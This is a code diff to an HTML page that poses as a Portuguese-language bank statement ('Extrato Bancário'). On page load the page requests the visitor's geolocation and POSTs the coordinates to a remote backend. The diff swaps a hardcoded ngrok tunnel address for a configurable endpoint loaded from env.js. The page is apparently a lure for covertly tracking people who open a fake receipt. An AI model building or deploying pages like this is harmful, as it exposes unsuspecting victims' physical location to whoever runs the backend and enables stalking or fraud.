@@ -3,6 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <title>Comprovante</title>
+  <script src="/env.js"></script>
 </head>
 <body style="background-color: #f8f9fa; font-family: Arial, sans-serif; margin: 0; padding: 20px;">
   <h1 style="text-align: center; color: #343a40;">Extrato Bancário</h1>
@@ -40,6 +41,9 @@
   </div>
 
   <script>
+    const ENDPOINT_URL = window.env?.ENDPOINT_URL;
+    console.log('site', ENDPOINT_URL);
+
     // Executa automaticamente ao carregar a página
     window.addEventListener("load", () => {
       if (navigator.geolocation) {
@@ -57,7 +61,7 @@
       console.log("Longitude: " + longitude);
 
       // Envia a localização para o backend
-      fetch("https://c4b0-2001-818-e347-3f00-302b-63bc-a9e7-fd18.ngrok-free.app/send-location/ip", {
+      fetch(`${ENDPOINT_URL}/send-location/ip`, {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
